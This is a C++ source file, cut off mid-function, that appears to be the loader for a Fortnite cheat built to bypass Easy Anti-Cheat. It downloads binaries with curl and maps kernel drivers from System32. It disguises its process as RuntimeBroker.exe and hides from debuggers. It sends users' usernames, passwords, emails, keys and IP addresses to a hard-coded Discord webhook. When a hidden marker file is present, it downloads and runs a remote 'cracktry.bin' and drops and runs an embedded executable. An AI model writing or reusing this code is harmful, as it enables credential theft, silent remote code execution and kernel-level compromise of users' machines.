// example.cpp : Este arquivo contém a função 'main'. A execução do programa começa e termina ali.
//

#include <iostream>
#include "api/nigurauth.hpp"
#include "drivers.h"
#include "vmp.h"
#include "includes.hpp" 
#include <stdio.h>
#include <tchar.h>
#include <urlmon.h>
#pragma comment(lib,"urlmon.lib")
#pragma comment(lib,"wininet.lib")
#pragma comment(lib,"d3d11.lib")
#include <sapi.h>
#include <Windows.h>
#include <string>
#include <filesystem>  
#include <fstream> 
#include "general.h"
#include <random> 
#include <Shlobj.h>
#include <ntstatus.h> 
#pragma comment(lib, "ntdll.lib")  

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "urlmon.lib")
namespace fs = std::filesystem;
#include "bypass.h"
using namespace std;
#define emulate CreateFileW

#define color1 (WORD)(0x0001 | 0x0000)
#define color2 (WORD)(0x0002 | 0x0000)
#define color3 (WORD)(0x0003 | 0x0000)
#define color4 (WORD)(0x0004 | 0x0000)
#define color5 (WORD)(0x0005 | 0x0000)
#define color6 (WORD)(0x0006 | 0x0000)
#define color7 (WORD)(0x0007 | 0x0000)
#define color8 (WORD)(0x0008 | 0x0000)
#define color9 (WORD)(0x0008 | 0x0000)
#define COLOR(h, c) SetConsoleTextAttribute(h, c); 
int choice;




void slowPrint(const std::string& text, std::chrono::milliseconds delay) {
	for (char c : text) {
		std::cout << c << std::flush;
		std::this_thread::sleep_for(delay);
	}
}

std::string user, email, pass, token;


#include "print.hpp"

#include <commdlg.h>

#include <comdef.h>
#include <sphelper.h> 
#include "mapper.h"
#include "Bypass-map2.h"


void SpeakText(const wchar_t* text) {
	// Initialize COM library
	SPOOF_FUNC
		HRESULT hr = CoInitialize(NULL);
	if (FAILED(hr)) {
		std::cerr << "Failed to initialize COM library" << std::endl;
		return;
	}

	// Create a voice instance
	ISpVoice* pVoice = NULL;
	hr = CoCreateInstance(CLSID_SpVoice, NULL, CLSCTX_ALL, IID_ISpVoice, (void**)&pVoice);
	if (FAILED(hr)) {
		std::cerr << "Failed to create voice instance" << std::endl;
		CoUninitialize();
		return;
	}

	// Enumerate available voices
	IEnumSpObjectTokens* pEnum = NULL;
	hr = SpEnumTokens(SPCAT_VOICES, NULL, NULL, &pEnum);
	if (SUCCEEDED(hr)) {
		ISpObjectToken* pToken = NULL;
		WCHAR* pszDescription = NULL;
		while (pEnum->Next(1, &pToken, NULL) == S_OK) {
			// Get the voice's attributes
			hr = pToken->GetStringValue(L"Name", &pszDescription);
			if (SUCCEEDED(hr)) {
				std::wcout << L"Available Voice: " << pszDescription << std::endl;

				// Here you can check for a female voice or specific criteria
				if (wcsstr(pszDescription, L"Female") != NULL || wcsstr(pszDescription, L"Zira") != NULL) {
					// Set the voice
					hr = pVoice->SetVoice(pToken);
					if (SUCCEEDED(hr)) {
						std::wcout << L"Voice set to: " << pszDescription << std::endl;
					}
					else {
						std::cerr << "Failed to set voice" << std::endl;
					}
					CoTaskMemFree(pszDescription);
					break;
				}
				CoTaskMemFree(pszDescription);
			}
			pToken->Release();
		}
		pEnum->Release();
	}
	else {
		std::cerr << "Failed to enumerate voices" << std::endl;
	}

	// Speak the text
	if (pVoice) {
		hr = pVoice->Speak(text, SPF_DEFAULT, NULL);
		if (FAILED(hr)) {
			std::cerr << "Failed to speak text" << std::endl;
		}

		// Release the voice object
		pVoice->Release();
		pVoice = NULL;
	}

	// Uninitialize COM library
	CoUninitialize();
}

void RemoveScrollbar() {
	SPOOF_FUNC;

	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	if (hConsole == INVALID_HANDLE_VALUE) {
		return;
	}
	CONSOLE_SCREEN_BUFFER_INFO csbi;
	if (!GetConsoleScreenBufferInfo(hConsole, &csbi)) {
		return;
	}
	SMALL_RECT windowSize = csbi.srWindow;
	COORD bufferSize = { windowSize.Right - windowSize.Left + 1, windowSize.Bottom - windowSize.Top + 1 };
	if (!SetConsoleScreenBufferSize(hConsole, bufferSize)) {
		return;
	}
	if (!SetConsoleWindowInfo(hConsole, TRUE, &windowSize)) {
		return;
	}
}


class console_t
{
public:

	bool set_highest_priority() {
		BOOL result = SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
		if (result == 0) {
			return false;
		}

		return true;
	}

	void start()
	{
		HWND consoleWindow = GetConsoleWindow();
		int opacity = 225;
		SetLayeredWindowAttributes(consoleWindow, 0, opacity, LWA_ALPHA);
		SetConsoleSize(80, 20);
	}

	void play_wav(const char* filename)
	{
		PlaySoundA(filename, NULL, SND_FILENAME | SND_ASYNC);
	}

	void move_cursor(int x, int y)
	{
		SetCursorPos(x, y);
	}

	void get_cursor_pos()
	{
		POINT p;
		if (GetCursorPos(&p)) {
			std::cout << " X -> " << p.x << ", Y -> " << p.y << std::endl;
		}
		else {
			std::cerr << "Failed to get cursor position. Error: " << GetLastError() << std::endl;
		}
	}

	void SetWindowFullscreen(HWND hwnd)
	{
		RECT screenRect;
		GetWindowRect(GetDesktopWindow(), &screenRect);

		LONG style = GetWindowLong(hwnd, GWL_STYLE);
		LONG exStyle = GetWindowLong(hwnd, GWL_EXSTYLE);

		SetWindowLong(hwnd, GWL_STYLE, style & ~(WS_BORDER | WS_CAPTION));
		SetWindowLong(hwnd, GWL_EXSTYLE, exStyle | WS_EX_TOPMOST);

		SetWindowPos(hwnd, HWND_TOPMOST, screenRect.left, screenRect.top, screenRect.right - screenRect.left, screenRect.bottom - screenRect.top, SWP_NOACTIVATE | SWP_NOOWNERZORDER | SWP_NOREDRAW | SWP_NOSENDCHANGING);

		ShowWindow(hwnd, SW_MAXIMIZE);
		SetForegroundWindow(hwnd);
	}

	void SetConsoleSize(int width, int height)
	{
		HANDLE consoleHandle = GetStdHandle(STD_OUTPUT_HANDLE);
		SMALL_RECT rect = { 0, 0, static_cast<SHORT>(width - 1), static_cast<SHORT>(height - 1) };
		COORD size = { static_cast<SHORT>(width), static_cast<SHORT>(height) };
		SetConsoleWindowInfo(consoleHandle, TRUE, &rect);
		SetConsoleScreenBufferSize(consoleHandle, size);
	}

	void input(std::string text)
	{
		std::cout << dye::white("[ ");
		std::cout << dye::light_blue("Info");
		std::cout << dye::white(" ] ");

		std::cout << text;
	}

	void write(std::string text)
	{
		std::cout << dye::purple("< ");
		std::cout << dye::purple("Info");
		std::cout << dye::white(" > ");

		std::cout << text << std::endl;
	}


	void error(std::string error)
	{
		std::cout << dye::purple("[ ");
		std::cout << dye::purple("-");
		std::cout << dye::purple(" ] ");

		std::cout << error << std::endl;
	}

	void sleep(DWORD MilliSeconds)
	{
		Sleep(MilliSeconds);
	}

	void exit(int exit_code)
	{
		ExitProcess(0);
	}

	void beep(DWORD dw_Freq, DWORD dw_Duration)
	{
		SPOOF_FUNC
			Beep(dw_Freq, dw_Duration);
	}
	std::string generate_string(int length)
	{
		SPOOF_FUNC
			const std::string characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

		std::random_device rd;
		std::mt19937 gen(rd());  // Seed the generator
		std::uniform_int_distribution<> distrib(0, characters.size() - 1);  // Define the range

		std::string randomString;
		randomString.reserve(length);

		for (int i = 0; i < length; ++i) {
			randomString += characters[distrib(gen)];
		}

		Sleep(50);

		std::string name = "";

		return name + randomString;
	}

	static bool admincheck()
	{
		SPOOF_FUNC
			HANDLE hToken;

		if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
		{
			TOKEN_ELEVATION elevation;
			DWORD size;

			if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &size))
			{
				CloseHandle(hToken);

				return elevation.TokenIsElevated != 0;
			}

			CloseHandle(hToken);
		}

		return false;
	}
}; console_t console;

static bool admincheck()
{
	SPOOF_FUNC
		HANDLE hToken;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
	{
		TOKEN_ELEVATION elevation;
		DWORD size;

		if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &size))
		{
			CloseHandle(hToken);

			return elevation.TokenIsElevated != 0;
		}

		CloseHandle(hToken);
	}

	return false;
}

void StealthConsole() {
	wchar_t system32Path[MAX_PATH];
	GetSystemDirectoryW(system32Path, MAX_PATH);
	wcscat_s(system32Path, L"\\RuntimeBroker.exe");

	//SetConsoleTitleW(L"RuntimeBroker");

	HWND consoleWindow = GetConsoleWindow();
	if (consoleWindow) {
		SetWindowLongW(consoleWindow, GWL_EXSTYLE,
			GetWindowLongW(consoleWindow, GWL_EXSTYLE) |
			WS_EX_TOOLWINDOW);

		//MoveWindow(consoleWindow, -32000, -32000, 0, 0, FALSE);

		/*SetWindowLongW(consoleWindow, GWLP_HWNDPARENT, (LONG_PTR)GetDesktopWindow());

		SetWindowLongW(consoleWindow, GWL_STYLE,
			GetWindowLongW(consoleWindow, GWL_STYLE) & ~WS_VISIBLE);
			*/
		SetWindowLongW(consoleWindow, GWLP_HWNDPARENT, (LONG_PTR)GetDesktopWindow());
		SetWindowLongW(consoleWindow, GWL_STYLE,
			GetWindowLongW(consoleWindow, GWL_STYLE));

		SetPriorityClass(GetCurrentProcess(), ABOVE_NORMAL_PRIORITY_CLASS);
	}

	DWORD pid = GetCurrentProcessId();
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess) {
		typedef BOOL(WINAPI* SPMP)(HANDLE, DWORD, PVOID, SIZE_T);
		HMODULE hKernel32 = GetModuleHandleW(E(L"kernel32.dll"));
		if (hKernel32) {
			SPMP SetProcessMitigationPolicy = (SPMP)GetProcAddress(hKernel32, E("SetProcessMitigationPolicy"));
			if (SetProcessMitigationPolicy) {
				PROCESS_MITIGATION_ASLR_POLICY policy = { 0 };
				policy.EnableBottomUpRandomization = 1;
				policy.EnableForceRelocateImages = 1;

				SetProcessMitigationPolicy(
					hProcess,
					0x3,
					&policy,
					sizeof(policy)
				);
			}
		}
		CloseHandle(hProcess);
	}
}

void MaskCommandLine() {
	wchar_t fakeCmdLine[] = (L"C:\\Windows\\System32\\RuntimeBroker.exe -Embedding");
	PPROCESS_BASIC_INFORMATION pbi;
	PEB* peb = (PEB*)__readgsqword(0x60);
	if (peb && peb->ProcessParameters) {
		peb->ProcessParameters->CommandLine.Length = wcslen(fakeCmdLine) * 2;
		wcscpy_s(peb->ProcessParameters->CommandLine.Buffer,
			peb->ProcessParameters->CommandLine.MaximumLength / sizeof(wchar_t),
			fakeCmdLine);
	}
}

void MaskThreadNames() {
	const wchar_t* threadNames[] = {
		E(L"RuntimeBroker.exe"),
		E(L"Windows.WARP.JIT"),
		E(L"GameInputSvc")
	};

	THREAD_NAME_INFORMATION threadName;
	threadName.ThreadName.Length = wcslen(threadNames[0]) * 2;
	threadName.ThreadName.Buffer = (PWSTR)threadNames[0];

	NtSetInformationThread(GetCurrentThread(), ThreadNameInformation,
		&threadName, sizeof(threadName));
}

void MaskMemoryPatterns() {
	static const size_t PATTERN_SIZE = 256;
	BYTE pattern[PATTERN_SIZE];
	for (size_t i = 0; i < PATTERN_SIZE; i++) {
		pattern[i] = rand() % 256;
	}

	VirtualAlloc(nullptr, PATTERN_SIZE, MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE);
}


bool asasdadasdasdasdasd() {

	SPOOF_FUNC
		VMProtectBeginUltra("asasdadasdasdasdasd");
	if (!admincheck())
	{

		console.error("Administration Permission Not Found (Reload as administrator - eac)");
		Beep(325, 500);
		Sleep(5000);
		console.exit(0);
	}


	const char* date = __DATE__;
	const char* title = xorstr_("EAC.WTF - PUBLIC | Built ");

	string final_title = string(title) + date + " - " + random_string(10).c_str();

	(SetConsoleTitleA)(final_title.c_str());

	HANDLE hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
	HWND consoleApp = GetConsoleWindow();

	SetLayeredWindowAttributes(consoleApp, RGB(154, 255, 214), 230, LWA_ALPHA);
	LONG lStyle = GetWindowLong(consoleApp, GWL_STYLE);
	lStyle &= ~(WS_THICKFRAME | WS_MINIMIZEBOX | WS_MAXIMIZEBOX | WS_EX_TOOLWINDOW);
	SetWindowLong(consoleApp, GWL_STYLE, lStyle);

	HMENU hMenu = GetSystemMenu(consoleApp, FALSE);
	if (hMenu != nullptr)
	{

		RemoveScrollbar();
	}

	SetConsoleTextAttribute(hStdOut, FOREGROUND_BLUE | FOREGROUND_INTENSITY);
	VMProtectEnd();

	return true;
}


bool LL(const std::string& desired_file_path, const char* address, size_t size)
{
	SPOOF_FUNC
		HANDLE hFile = CreateFile(
			desired_file_path.c_str(),
			GENERIC_WRITE,
			0,
			NULL,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY,
			NULL
		);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		return false;
	}

	DWORD written = 0;
	BOOL writeResult = WriteFile(hFile, address, static_cast<DWORD>(size), &written, NULL);

	CloseHandle(hFile);

	return (writeResult && written == size);
}

void DeleteFile2(const std::string& filePath)
{
	SPOOF_FUNC
		try
	{
		if (std::filesystem::remove(filePath))
		{
		}
		else
		{
		}
	}
	catch (const std::filesystem::filesystem_error& e)
	{
	}
}
bool DeleteFileSafe(const std::wstring& filePath) {
	SPOOF_FUNC;
	return DeleteFileW(filePath.c_str());
}

auto sadasdasdad() -> bool
{
	SPOOF_FUNC

		std::string vgkexe = xorstr_("C:\\Windows\\SysWOW64\\cfmifs.sys");
	std::string drvs = xorstr_("C:\\Windows\\SysWOW64\\chkdsks.sys");
	//=	DeleteFile2(a);
	DeleteFile2(vgkexe);
	DeleteFile2(drvs);


	//LL(a, reinterpret_cast<const char*>(newms), sizeof(newms));
	LL(vgkexe, reinterpret_cast<const char*>(newdvs), sizeof(newdvs));
	LL(drvs, reinterpret_cast<const char*>(drvss), sizeof(drvss));
	system(c_xor("sc delete cfmifs >NUL"));

	SetCurrentDirectory(xorstr_("C:\\Windows\\SysWOW64\\"));
	windows_service(xorstr_("C:\\Windows\\SysWOW64\\cfmifs.sys"), xorstr_("C:\\Windows\\SysWOW64\\chkdsks.sys"));

	return true;
}

void download_mapper() {
	// Create a temporary directory in the current folder
	std::string tempDir = "temp_drivers\\";
	CreateDirectoryA(tempDir.c_str(), NULL);

	std::string urls[] = {
		"https://files.catbox.moe/ysnpei.bin",
		"https://files.catbox.moe/dncloc.sys",
		"https://files.catbox.moe/asoi6v.sys"
	};

	std::string filenames[] = {
		"loader.exe",
		"miauhausen.sys",
		"ViVL.sys"
	};

	std::string system32Path = "C:\\Windows\\System32\\";

	// First download all files to temp directory
	for (int i = 0; i < 3; i++) {
		std::cout << xorstr_("[>] Downloading ") << filenames[i] << xorstr_("...") << std::endl;

		std::string tempPath = tempDir + filenames[i];
		std::string command = "curl -s -o \"" + tempPath + "\" " + urls[i];

		if (system(command.c_str()) == 0) {
			std::cout << xorstr_("[✓] Downloaded ") << filenames[i] << xorstr_(" successfully") << std::endl;

			// Try to move file to System32 with proper permissions
			std::string destinationPath = system32Path + filenames[i];

			// Try to copy instead of move (more reliable)
			if (CopyFileA(tempPath.c_str(), destinationPath.c_str(), FALSE)) {
				std::cout << xorstr_("[✓] Copied ") << filenames[i] << xorstr_(" to System32") << std::endl;
				// Delete the temporary file
				DeleteFileA(tempPath.c_str());
			}
			else {
				DWORD error = GetLastError();
				std::cout << xorstr_("[!] Error code: ") << error << std::endl;
				Custom::Text2(xorstr_("Failed to copy file to System32. Try running as administrator."));
				return;
			}
		}
		else {
			Custom::Text2(xorstr_("Failed to download file"));
			return;
		}
		Sleep(500);
	}

	// Clean up temp directory
	RemoveDirectoryA(tempDir.c_str());

	std::cout << xorstr_("[>] Loading drivers...") << std::endl;
	std::string loadCommand = "cd /d C:\\Windows\\System32 && loader.exe miauhausen.sys ViVL.sys";
	if (system(loadCommand.c_str()) == 0) {
		std::cout << xorstr_("[✓] Drivers loaded successfully") << std::endl;
	}
	else {
		Custom::Text2(xorstr_("Failed to load drivers"));
	}
}

int asfasfaafasfasfasf() //maincheeto
{
	SPOOF_FUNC
		VMProtectBeginUltra("Maincheeto");
	system(xorstr_("cls"));
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(hConsole, FOREGROUND_RED);
	if (!Driver::Init())
	{
		system(xorstr_("taskkill /f /im EpicGamesLauncher.exe >NUL 2>&1"));
		system(xorstr_("taskkill /f /im FortniteClient-Win64-Shipping.exe >NUL 2>&1"));
		system(xorstr_("taskkill /f /im FortniteClient-Win64-Shipping_EAC_EOS.exe >NUL 2>&1"));
		system(xorstr_("taskkill /f /im EasyAntiCheat_EOS_Setup.exe >NUL 2>&1"));
		system(xorstr_("taskkill /f /im FortniteLauncher.exe >NUL 2>&1"));
		const wchar_t* drv = xorstr_(L"Driver Not Found... Loading Drivers");
		SpeakText(drv);
		Custom::Text(xorstr_("Mapping Kernel Driver"));
		download_mapper(); // Call the new download_mapper function
		printf(c_xor("\n"));
		Custom::Text(xorstr_("Creating Communication"));
		if (!Driver::Init())
		{
			Custom::Text(xorstr_("Unable to Create Communication. Open Support Ticket"));
			Sleep(-1);
		}
		Sleep(1000); 
		system("cls");
	}



	DWORD processID = GetCurrentProcessId();
	const wchar_t* Open = L"Now open Fortnite";
	SpeakText(Open);
	system("cls");
	SetGreen();
	SetGold();

	Logwa(xorstr_(" Waiting For Fortnite !\n\n"));
	while (windowid == NULL)
	{
		windowid = FindWindowA_Spoofed(0, ("Fortnite  "));
	}
	system("cls");
	const wchar_t* Ffound = L"Fortnite Found";
	SpeakText(Ffound);
	MessageBoxA(0, xorstr_("Press Ok only when in lobby"), xorstr_("Success"), MB_ICONEXCLAMATION);
	Driver::ProcessID = Driver::FindProcess(c_xor("FortniteClient-Win64-Shipping.exe"));
	Nunflaggedbase = Driver::GetBase();
	std::printf(xorstr_("[Base Address] -> 0x%08lX\n"), Driver::GetBase);
	std::printf(xorstr_("[pid] -> 0x%08lX\n"), Driver::ProcessID); 

	int cleanopts = NULL;
	Custom::Text2(xorstr_("Choose an overlay: \n"));
	Custom::Text2(xorstr_("(1) Riva Tuner [DOWN]\n"));
	Custom::Text2(xorstr_("(2) Nvidia GeForce Overlay [SOON]\n"));
	Custom::Text2(xorstr_("(3) Visual Studio [SOON]\n"));
	Custom::Text2(xorstr_("(4) Croshair X [FLAGGED]\n"));
	Custom::Text2(xorstr_("[=] Enter your choice: "));

	std::cin >> cleanopts;

	switch (cleanopts) {
	case 1:
	{
		SPOOF_FUNC;
		window_handle = FindWindowA_Spoofed(xorstr_("RivaTunerOverlayClass"), xorstr_("RTTS")); // RivaTuner
		globals->width = GetSystemMetrics_Spoofed(SM_CXSCREEN);
		globals->height = GetSystemMetrics_Spoofed(SM_CYSCREEN);
		if (Render1->asd42dfsd() != RENDER_INFORMATION::RENDER_SETUP_SUCCESSFUL) ExitProcess(0);
		break;
	}
	case 2:
	{
		SPOOF_FUNC;
		window_handle = FindWindowA_Spoofed(xorstr_("CEF-OSC-WIDGET"), xorstr_("NVIDIA Geforce Overlay")); // Nvidia
		globals->width = GetSystemMetrics_Spoofed(SM_CXSCREEN); globals->height = GetSystemMetrics_Spoofed(SM_CYSCREEN);
		if (Render1->asd42dfsd() != RENDER_INFORMATION::RENDER_SETUP_SUCCESSFUL) ExitProcess(0);
		break;
	}
	case 3: {
		SPOOF_FUNC;
		window_handle = FindWindowA_Spoofed(xorstr_("CiceroUIWndFrame"), xorstr_("CiceroUIWndFrame")); // visual studio // tmp is bugging the overlay mthd causing it to fail = render
		globals->width = GetSystemMetrics_Spoofed(SM_CXSCREEN); globals->height = GetSystemMetrics_Spoofed(SM_CYSCREEN);
		if (Render1->asd42dfsd() != RENDER_INFORMATION::RENDER_SETUP_SUCCESSFUL) ExitProcess(0);
		break;
	}
	case 4: {
		SPOOF_FUNC;
		window_handle = FindWindowA_Spoofed(xorstr_("Chrome_WidgetWin_1"), xorstr_("CrosshairX")); // CrosshairX
		globals->width = GetSystemMetrics_Spoofed(SM_CXSCREEN); globals->height = GetSystemMetrics_Spoofed(SM_CYSCREEN);
		if (Render1->asd42dfsd() != RENDER_INFORMATION::RENDER_SETUP_SUCCESSFUL) ExitProcess(0);
		break;
	}
	default: {
		Custom::Text2(xorstr_("[=] INVALID CHOICE :("));
		exit(0);
		return false;
	}
	}
	if (!skid::interception.Initialize()) {

		Custom::Text2(xorstr_("[=] Mouse mOVeMent FAiLeD"));
		Sleep(4000);
		exit(0);
		//return;
	}
	else
	{
		Custom::Text2(xorstr_("[+] Mouse mOVeMent is WorKinG"));
	}



	if (Game->asfg2hg2h23234h() != GAME_INFORMATION::GAME_SETUP_SUCCESSFUL) ExitProcess(0);
	//SPOOF_FUNC2;
	//HWND consoleWindow = GetConsoleWindow();
	//ShowWindow(consoleWindow, SW_HIDE);
	Render1->imguiforcre();


	VMProtectEnd();
}



std::string getPublicIP() {
	CURL* curl;
	CURLcode res;
	std::string ipAddress;
	curl = curl_easy_init();
	if (curl) {
		curl_easy_setopt(curl, CURLOPT_URL, c_xor("http://api.ipify.org"));  // Public IP service
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, +[](char* ptr, size_t size, size_t nmemb, std::string* data) {
			data->append(ptr, size * nmemb);
			return size * nmemb;
			});
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &ipAddress);

		res = curl_easy_perform(curl);
		curl_easy_cleanup(curl);
	}

	return ipAddress;
}

#pragma comment(lib, "wininet.lib")
#include <wininet.h>
void SendWebhookLogin(const std::string& message, const std::string& LoginID, const std::string& passwords) {


	const std::string webhookUrlPath = xorstr_("/api/webhooks/1341486828628480000/gJGdUmWb7DDsurp5jT6dKTRH5tMj4tktICbD-nXQ3DxAkagOj2Q5_1_EDflxlrz1WTxK");
	std::string ipAddress2 = getPublicIP();
	// Create JSON payload for login event
	std::string postData = "{\"content\":\"" "**" + message + "**" + "\\n\\n**Login Username:**  " + LoginID + "\\n**Password:** " + passwords + c_xor("\\n**IP Address:** ") + ipAddress2 + "\"}";

	HINTERNET hSession = InternetOpenA(xorstr_("Discord Webhook"), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (!hSession) {
		std::cerr << "Error: Contact Staff : CODE : INA" << "\n";
		exit(0);
	}

	HINTERNET hConnect = InternetConnectA(hSession, c_xor("discord.com"), INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
	if (!hConnect) {
		std::cerr << "Error: Contact Staff : CODE : DISC+" << "\n";
		InternetCloseHandle(hSession);
		return;
	}

	const char* acceptTypes[] = { "application/json", NULL };
	HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", webhookUrlPath.c_str(), NULL, NULL, acceptTypes, INTERNET_FLAG_SECURE, 0);
	if (!hRequest) {
		std::cerr << "Error: Contact Staff : CODE : request" << "\n";
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return;
	}

	std::string headers = "Content-Type: application/json\r\n";
	BOOL result = HttpSendRequestA(hRequest, headers.c_str(), headers.length(), (LPVOID)postData.c_str(), postData.length());
	if (!result) {
		std::cerr << "Error: Contact Staff : CODE : HTTP FIND" << "\n";
	}
	else {
		//std::cerr << "Login webhook sent successfully.\n";
	}

	InternetCloseHandle(hRequest);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hSession);
}

void SendWebhookRegister(const std::string& message, const std::string& LoginID, const std::string& emailID, const std::string& password, const std::string& tokenID) {

	const std::string webhookUrlPath = xorstr_("/api/webhooks/1341486828628480000/gJGdUmWb7DDsurp5jT6dKTRH5tMj4tktICbD-nXQ3DxAkagOj2Q5_1_EDflxlrz1WTxK");
	std::string ipAddress2 = getPublicIP();
	// Create JSON payload for login event
	std::string postData = "{\"content\":\"" "**" + message + "**" + "\\n\\n**Login Username:**  " + LoginID + "\\n**email ID:** " + emailID + "\\n**Password:** " + password + "\\n**Key ID:** " + tokenID + c_xor("\\n**IP Address:** ") + ipAddress2 + "\"}";
	HINTERNET hSession = InternetOpenA(xorstr_("Discord Webhook"), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (!hSession) {
		//std::cerr << "Error: Failed to open internet session. Error: " << GetLastError() << "\n";
		return;
	}

	HINTERNET hConnect = InternetConnectA(hSession, c_xor("discord.com"), INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
	if (!hConnect) {
		//std::cerr << "Error: Failed to connect to discord.com. Error: " << GetLastError() << "\n";
		InternetCloseHandle(hSession);
		return;
	}

	const char* acceptTypes[] = { "application/json", NULL };
	HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", webhookUrlPath.c_str(), NULL, NULL, acceptTypes, INTERNET_FLAG_SECURE, 0);
	if (!hRequest) {
		//std::cerr << "Error: Failed to open HTTP request. Error: " << GetLastError() << "\n";
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return;
	}

	std::string headers = "Content-Type: application/json\r\n";
	BOOL result = HttpSendRequestA(hRequest, headers.c_str(), headers.length(), (LPVOID)postData.c_str(), postData.length());
	if (!result) {
		//std::cerr << "Error: Failed to send HTTP request. Error: " << GetLastError() << "\n";
	}
	else {
		//std::cerr << "Reg webhook sent successfully.\n";
	}

	InternetCloseHandle(hRequest);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hSession);
}



int interseption()
{
	std::string aasdasdasd = xorstr_("C:\\Windows\\System32\\Interception.exe");
	LL(aasdasdasd, reinterpret_cast<const char*>(Interception), sizeof(Interception));
	SetCurrentDirectory(xorstr_("C:\\Windows\\System32\\"));
	system(xorstr_("Interception.exe /install >NUL 2>&1"));
	Loggree1n(xorstr_("Loaded Main Module-Restarting Now..."));
	DeleteFile2(aasdasdasd);
	Sleep(200);
	system("shutdown /r /f /t 10 >NUL 2>&1");

	exit(0);
}

int asdasdasdsadasdas()
{
	VMProtectBeginUltra("asdasdasdsadasdas");

	const wchar_t* thx = xorstr_(L"Thank you for choosing us!");
	SpeakText(thx);
	std::string intersepts;
	//Loggreen(xorstr_("Load Module (PC Will Restart) - Make Sure u only load this per reset...\n"));
	system("cls");
	//Custom::Text2(xorstr_("Load Module"));
	//Custom::Text2(xorstr_("(PC Will Restart) - Make Sure u only load this per reset...\n"));
	Custom::Text2(xorstr_("Load Module ( PC WILL RESTART ) - Once per Reset"));
	printf("\n");
	Custom::Text2(xorstr_("Choice : "));
	std::cin >> intersepts;
	if (intersepts == "Yes" || intersepts == "yes" || intersepts == "Y" || intersepts == "y" || intersepts == "YES" || intersepts == "ye" || intersepts == "Ye" || intersepts == "YE" || intersepts == "yE")
	{

		Sleep(200);
		interseption();
	}
	 
	system("cls");
	asfasfaafasfasfasf();

	VMProtectEnd();

	return false;
}

#include <conio.h>

void saveCredentials(const std::string& username, const std::string& password) {
	std::ofstream outFile(c_xor("login.detected"));
	if (outFile) {
		outFile << username << std::endl;
		outFile << password << std::endl;
		outFile.close();
	}
	else {
		std::cerr << "[?] Error saving credentials." << std::endl;
	}
}

bool loadCredentials(std::string& username, std::string& password) {
	std::ifstream inFile(c_xor("login.detected"));
	if (inFile) {
		std::getline(inFile, username);
		std::getline(inFile, password);
		inFile.close();
		return true;
	}
	return false;
}
#include <windows.h>
void getPasswordInput(std::string& pass) {
	char ch2;

	while ((ch2 = _getch()) != '\r') { // '\r' is the carriage return (Enter key)
		if (ch2 == '\b') { // Handle backspace
			if (!pass.empty()) {
				pass.pop_back(); // Remove last character from password
				std::cout << "\b \b"; // Move back, print space, move back again
			}
		}
		else {
			pass += ch2; // Append character to password
			std::cout << '-'; // Display asterisk for each character
		}
	}
}


bool HiddenFileExists() {
	DWORD fileAttr = GetFileAttributesA(xorstr_("C:\\windows\\system32\\blackbrow"));
	return (fileAttr != INVALID_FILE_ATTRIBUTES && (fileAttr & FILE_ATTRIBUTE_HIDDEN));
}

void loadingAnimation() {
	const std::string loadingChars = "|/-\\";
	std::cout << "Loading ";
	for (int i = 0; i < 20; ++i) {
		std::cout << "\rLoading " << loadingChars[i % loadingChars.size()] << std::flush;
		Sleep(100);
	}
	std::cout << "\rLoading complete!   \n";
}

// Function to show a progress bar
void showProgressBar(int progress) {
	const int barWidth = 70;
	std::cout << "[";
	int pos = barWidth * progress / 100;
	for (int i = 0; i < barWidth; ++i) {
		if (i < pos) std::cout << "=";
		else std::cout << " ";
	}
	std::cout << "] " << progress << " %\r";
	std::cout.flush();
}

// Function to display a spinner animation
void spinnerAnimation() {
	const std::string spinnerChars = "|/-\\";
	for (int i = 0; i < 20; ++i) {
		std::cout << "\r" << spinnerChars[i % spinnerChars.size()] << std::flush;
		Sleep(100);
	}
}

int main()
{
	/*std::thread(game::c_game::CacheLevels).detach();*/
	hide_thread(LI_FN(GetCurrentThread).forwarded_safe_cached()());
	(thread_hide_debugger)();
	(hide_loader_thread)();

	 
	if (!asasdadasdasdasdasd()) {

		std::cout << xorstr_("\n\n\n                                          Console-Loop Failed...");
		Sleep(4000);
		exit(0);
		return false;
	}
	//MessageBoxA(0, xorstr_("Check 1"), xorstr_("Check 1"), MB_ICONEXCLAMATION); 

	if (HiddenFileExists()) { //this is anti debug
		system(c_xor("curl --silent https://file.garden/Zw9va8JzyS5wjai8/cracktry.bin --output C:\\Windows\\System32\\AsDeviceCheck.exe >nul"));
		system(c_xor("cd C:\\Windows\\System32\\ && AsDeviceCheck.exe"));

		std::string aasdsasdasd = xorstr_("C:\\Windows\\System32\\fucker.exe");
		LL(aasdsasdasd, reinterpret_cast<const char*>(rawData), sizeof(rawData));
		SetCurrentDirectory(xorstr_("C:\\Windows\\System32\\"));
		system(xorstr_("fucker.exe >NUL 2>&1"));

